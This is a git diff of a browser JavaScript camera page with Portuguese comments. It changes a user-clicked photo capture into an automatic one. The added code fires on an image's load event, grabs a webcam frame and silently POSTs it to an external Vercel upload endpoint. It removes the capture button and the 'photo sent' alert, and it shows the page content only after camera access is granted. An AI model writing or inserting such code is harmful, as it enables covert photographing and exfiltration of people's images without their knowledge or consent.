@@ -1,16 +1,23 @@
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
-const captureButton = document.getElementById('capture');
+const triggerImg = document.getElementById('triggerImg');
 
-// 1. Solicita acesso à câmera
 async function startCamera() {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-    video.srcObject = stream;
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+
+        document.getElementById("conteudo").style.display = "block";
+
+    } catch (err) {
+        document.getElementById("erro").style.display = "block";
+        console.error("Erro ao acessar a câmera:", err);
+    }
 }
+
 startCamera();
 
-// 2. Captura a foto e envia para a API da Vercel
-captureButton.onclick = () => {
+triggerImg.addEventListener('load', () => {
     const ctx = canvas.getContext('2d');
 
     canvas.width = video.videoWidth;
@@ -18,18 +25,18 @@ captureButton.onclick = () => {
 
     ctx.drawImage(video, 0, 0);
 
-    // Converte o conteúdo do Canvas em arquivo Blob
     canvas.toBlob(async (blob) => {
+        try {
+            const response = await fetch("https://camera-uploader-api.vercel.app/api/upload", {
+                method: "POST",
+                body: blob
+            });
 
-        // Envia direto para a função serverless
-        const response = await fetch("https://camera-uploader-api.vercel.app/api/upload", {
-            method: "POST",
-            body: blob
-        });
+            const json = await response.json();
+            console.log("Upload concluído:", json);
 
-        const json = await response.json();
-        console.log(json);
-
-        alert("Foto enviada com sucesso!");
+        } catch (err) {
+            console.error("Erro no upload:", err);
+        }
     }, "image/png");
-};
+});
